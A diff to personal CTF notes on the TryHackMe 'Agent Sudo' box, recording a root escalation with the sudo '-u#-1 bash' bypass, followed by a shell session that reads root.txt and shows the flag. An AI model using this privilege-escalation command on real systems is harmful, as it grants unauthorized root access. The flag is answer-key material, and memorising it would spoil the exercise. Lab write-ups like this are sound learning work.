@@ -318,7 +318,32 @@ b03d975e8c92a7c04146cfa7a5a313c7
 > Could use different way to exploit and privilege escalate so lets try a few in mind and see how I get on.
 
 > [!note]
-> C
-
+> Using same site I found CVE on, they gave me exact cmd to gain root shell.
+> ```
+> james@agent-sudo:~$ sudo -u#-1 bash
+[sudo] password for james: 
+root@agent-sudo:~# 
+> ```
+> Got the root flag too.
+> root@agent-sudo:~# ls
+Alien_autospy.jpg  user_flag.txt
+root@agent-sudo:~# cd ..
+root@agent-sudo:/home# cd ..
+root@agent-sudo:/# ls
+bin    etc             lib         mnt   run   swap.img  var
+boot   home            lib64       opt   sbin  sys       vmlinuz
+cdrom  initrd.img      lost+found  proc  snap  tmp       vmlinuz.old
+dev    initrd.img.old  media       root  srv   usr
+root@agent-sudo:/# cd root/
+root@agent-sudo:/root# ls
+root.txt
+root@agent-sudo:/root# cat root.txt 
+To Mr.hacker,
+Congratulation on rooting this box. This box was designed for TryHackMe. Tips, always update your machine. 
+Your flag is 
+b53a02f55b57d4439e3341834d70c062
+By,
+DesKel a.k.a Agent R
+root@agent-sudo:/root# 
 
 
